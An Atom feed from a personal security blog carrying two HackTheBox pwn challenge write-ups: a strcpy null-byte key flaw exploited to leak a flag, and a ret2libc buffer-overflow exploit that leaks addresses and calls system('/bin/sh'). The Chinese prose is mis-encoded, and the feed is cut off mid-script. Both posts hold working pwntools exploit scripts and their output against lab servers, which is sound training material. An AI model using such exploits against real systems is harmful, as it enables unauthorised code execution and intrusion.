<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-11-07T01:17:22.919Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox-Challenges Vault-breaker Writeup</title>
    <link href="https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/"/>
    <id>https://kazma.tw/2024/11/07/HackTheBox-Challenges-Vault-breaker-Writeup/</id>
    <published>2024-11-06T16:39:57.584Z</published>
    <updated>2024-11-07T01:17:22.919Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>é€™é¡Œä¿è­·å…¨é–‹ï¼Œç„¶å¾Œç¨‹å¼ä¸»é‚è¼¯å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">new_key_gen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> random_fd; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> random_fd2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 input_num; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *random_fp; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> key_buf[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0LL</span>;</span><br><span class="line">  input_num = <span class="number">34LL</span>;</span><br><span class="line">  random_fp = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !random_fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;\n%sError opening /dev/urandom, exiting..\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">21</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( input_num &gt; <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Length of new password (0-%d): &quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">    input_num = read_num();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(key_buf, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  random_fd = fileno(random_fp);</span><br><span class="line">  read(random_fd, key_buf, input_num);</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; input_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !key_buf[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      random_fd2 = fileno(random_fp);</span><br><span class="line">      read(random_fd2, &amp;key_buf[i], <span class="number">1uLL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(random_key, key_buf);</span><br><span class="line">  fclose(random_fp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n%s[+] New key has been genereated successfully!\n%s&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>é€™é‚Šçš„å•é¡Œå°±æ˜¯ä»–æœƒè®“æˆ‘å€‘ç”Ÿæˆéš¨æ©Ÿé•·åº¦çš„å¯†é‘°ï¼Œä½†æ˜¯ä»–ç”¨ <code>strcpy</code> è€Œä¸æ˜¯ <code>memcpy</code>ï¼Œé€™å°è‡´ä»–æœƒæŠŠ null byte ä¹Ÿè¤‡è£½éå»ï¼Œæ‰€ä»¥æˆ‘å€‘å°±å¯ä»¥é€éä¸åŒé•·åº¦çš„å¯†é‘°ä¾†æ§åˆ¶ null byte çš„ä½ç½®ï¼Œè€Œä»–åšçš„å°±åªæ˜¯æŠŠ random key è·Ÿ flag åš xor è€Œå‰›å¥½ xor 0 ä¸æœƒè®Šã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>é€™é‚Šæä¾›å…©ç¨®è§£æ³•ï¼š</p><ol><li>ç¬¬ä¸€ç¨®æ˜¯å‡è¨­æˆ‘å€‘å¯†é‘°ç­‰æ–¼ 0 æ‰€ä»¥ random key ç¬¬ä¸€ä½å°±æœƒç­‰æ–¼ null byteï¼Œé€™æ™‚æˆ‘å€‘å°±å¯ä»¥çœ‹åˆ° flag çš„ç¬¬ä¸€ä½ï¼Œä»¥æ­¤é¡æ¨ï¼Œæˆ‘å€‘å¾ 0 åˆ° 31 å°±å¯ä»¥å¾—åˆ°æ•´å€‹ flagï¼š<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;HTB&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">b&quot;&#125;&quot;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(flag)))</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">    r.recv(<span class="built_in">len</span>(flag))</span><br><span class="line">    flag += r.recv(<span class="number">1</span>)</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>åŸ·è¡Œçµæœï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python vault.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_k&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_ku&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kud&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudu&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n&#x27;</span></span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">[*] Closed connection to 94.237.52.225 port 39459</span><br><span class="line">b<span class="string">&#x27;HTB&#123;d4nz4_kudur0r0r0&#125;\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure></div>å› ç‚ºä»– flag æœ‰åŠ æ›è¡Œæ‰€ä»¥æ²’æœ‰æ­£å¸¸çµ‚æ­¢ï¼Œå¯ä»¥æ”¹æˆ endswith ä¹‹é¡çš„ã€‚</li><li>ç¬¬äºŒç¨®æ˜¯æˆ‘å€‘å¾ 31 è¨­å®šå›ä¾†ï¼Œé€™æ¨£ random key å°±éƒ½æœƒæ˜¯ null byteï¼š<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.52.225&quot;</span>, <span class="number">39459</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i=&#125;</span>&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Vault: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>åŸ·è¡Œçµæœï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ python vault2.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">i=31</span><br><span class="line">i=30</span><br><span class="line">i=29</span><br><span class="line">i=28</span><br><span class="line">i=27</span><br><span class="line">i=26</span><br><span class="line">i=25</span><br><span class="line">i=24</span><br><span class="line">i=23</span><br><span class="line">i=22</span><br><span class="line">i=21</span><br><span class="line">i=20</span><br><span class="line">i=19</span><br><span class="line">i=18</span><br><span class="line">i=17</span><br><span class="line">i=16</span><br><span class="line">i=15</span><br><span class="line">i=14</span><br><span class="line">i=13</span><br><span class="line">i=12</span><br><span class="line">i=11</span><br><span class="line">i=10</span><br><span class="line">i=9</span><br><span class="line">i=8</span><br><span class="line">i=7</span><br><span class="line">i=6</span><br><span class="line">i=5</span><br><span class="line">i=4</span><br><span class="line">i=3</span><br><span class="line">i=2</span><br><span class="line">i=1</span><br><span class="line">i=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;d4nz4_kudur0r0r0&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/vault_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;é€™é¡Œä¿è­·å…¨é–‹ï¼Œç„¶å¾Œç¨‹å¼ä¸»é‚è¼¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div cla</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Retribution Writeup</title>
    <link href="https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/"/>
    <id>https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/</id>
    <published>2024-11-06T06:04:48.148Z</published>
    <updated>2024-11-06T07:11:15.380Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>ç›´æ¥ä¾†çœ‹é€™é¡Œçš„ä¸»é‚è¼¯å’Œä¿è­·æ©Ÿåˆ¶ï¼š<br>PIE æœ‰é–‹ï¼Œæœ‰ canaryï¼Œæ‰€ä»¥è¦ leak stack variable ç„¶å¾Œ ret2libc </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec ./sp_retribution</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">missile_launcher</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0x53E5854620FB399F</span>LL;</span><br><span class="line">  v3 = <span class="number">0x576B96B95DF201F9</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n[*] Current target&#x27;s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinates: x = [0x%lx], y = &quot;</span>,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL,</span><br><span class="line">    <span class="number">0x576B96B95DF201F9</span>LL,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): &quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x84</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">&quot;\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!%s\n&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;31m&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°æœ‰å…©å€‹æ˜é¡¯çš„æ¼æ´ã€‚<br>é¦–å…ˆæ˜¯ buf æ²’æœ‰è¢«åˆå§‹åŒ–ï¼Œç„¶å¾Œåˆè¢«å°å‡ºä¾†ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å˜—è©¦é€éè¦†è“‹ä¸åŒé•·åº¦çš„ offset ä¾†æ‰¾åˆ°å¯ä»¥ç”¨çš„ stack address ç”šè‡³æ˜¯ libc addressï¼Œé€™éƒ¨åˆ†å¾ˆå¤šç¶²è·¯ä¸Šçš„ writeup éƒ½è¬›éŒ¯ï¼Œæ¼æ´ä¸»å› æ˜¯æ²’æœ‰åˆå§‹åŒ–æ‰å°ã€‚<br>ç„¶å¾Œç¬¬äºŒå€‹ read æ˜¯ bof æ‡‰è©²æ²’ä»€éº¼å•é¡Œï¼Œæ‰€ä»¥æˆ‘å€‘çš„ç›®æ¨™å°±æ˜¯ leak stack addressï¼Œç„¶å¾Œç®—å‡º pie baseï¼Œæ¥è‘—åˆ©ç”¨ pie base call puts leak got æ‰¾ libc baseï¼Œæœ€å¾Œ bof system(â€˜&#x2F;bin&#x2F;shâ€™)ã€‚</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;sp_retribution&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./glibc/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./sp_retribution&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;94.237.59.180&quot;</span>, <span class="number">45699</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Find PIE Base</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[*] Insert new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">7</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaaaaa\n&quot;</span>)</span><br><span class="line">leak = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;Leaked PIE --&gt; %#0x&quot;</span>, leak)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">base = leak - <span class="number">3440</span></span><br><span class="line">success(<span class="string">&quot;Find PIE Base --&gt; %#0x&quot;</span>, base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Find Libc Base</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>,</span><br><span class="line">    base + rop.rdi[<span class="number">0</span>],</span><br><span class="line">    base + elf.got.puts,</span><br><span class="line">    base + elf.plt.puts,</span><br><span class="line">    base + elf.sym.missile_launcher,</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_got = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">l.address = puts_got - l.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;Find libc base --&gt; %#0x&quot;</span>, l.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">system = l.sym.system</span><br><span class="line">bin_sh = <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>, base + rop.rdi[<span class="number">0</span>], bin_sh, system)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): 